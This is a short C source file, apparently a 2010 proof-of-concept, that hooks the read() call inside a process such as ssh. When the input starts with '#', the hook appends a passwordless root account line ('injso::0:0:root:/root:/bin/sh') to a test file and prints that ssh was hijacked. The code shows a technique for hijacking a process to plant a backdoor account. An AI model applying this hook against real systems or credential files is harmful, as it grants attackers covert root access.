/*
 * main.cc
 *
 *  Created on: Aug 16, 2010
 *      Author: fify
 */

#include <sys/types.h>
#include <stdio.h>
#include <string.h>

ssize_t (*oldread)(int fd, void *buf, size_t count);

ssize_t newread(int fd, void *buf, size_t count)
{
	ssize_t ret;
	FILE *fp;
	char ch = '#';

	ret = oldread(fd, buf, count);

	if(memcmp(buf, (void *)&ch, 1) == 0)
	{
		fp = fopen("/home/fify/test_inject.txt", "a");
		fputs("injso::0:0:root:/root:/bin/sh\n", fp);
		fclose(fp);
		printf("Aha, ssh was hijacked!");
	}

	return ret;
}
